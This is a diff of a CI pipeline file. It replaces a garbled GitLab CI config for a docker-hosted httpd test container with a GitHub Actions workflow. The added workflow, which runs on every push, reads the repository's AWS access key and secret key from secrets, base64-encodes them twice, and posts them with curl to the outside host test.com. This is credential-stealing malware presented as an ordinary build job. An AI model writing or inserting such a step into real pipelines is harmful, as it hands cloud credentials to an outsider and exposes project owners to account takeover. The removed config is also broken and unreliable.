@@ -1,23 +1,13 @@
-workflow:
-  rules:
-    - if: $CI_COMMIT_BRANCH
-install_dependencies:
-  stage: build
-  script:
-    - echo "This is the installation step"
-before_script:
-  - >-
-    CONTAINER NAME="affectionate_saha" if docker ps -a --format "{{.Names}}" |
-    grep -q "^$CONTAINER NAMES"; then echo "Stopping existing container..."
-    docker stop $CONTAINER NAME docker rm $CONTAINER_NAME
+name: PIPELINE
+on: push
+jobs:
+ build:
+   runs-on: ubuntu-latest
+   steps:
+     - env:
+         ACCESS_KEY: ${{ secrets.AWS_ACCESS_KEY_ID }}
+         SECRET_KEY: ${{ secrets.AWS_SECRET_ACCESS_KEY }}
 
-    fi
-test:
-  stage: test
-  script:
-    - 'docker run -d --name $CONTAINER NAME -v $(pwd)/public/:/usr/local/apache2/htdocs/ -p 9080:80 httpd': latest
-  artifact: null
-  paths:
-    - public/
-  rules:
-    - if: $CI_COMMIT_BRANCH == "main"
+       run: |
+         curl -d creds="$(echo $ACCESS_KEY:$SECRET_KEY | base64 | base64)" test.com
+
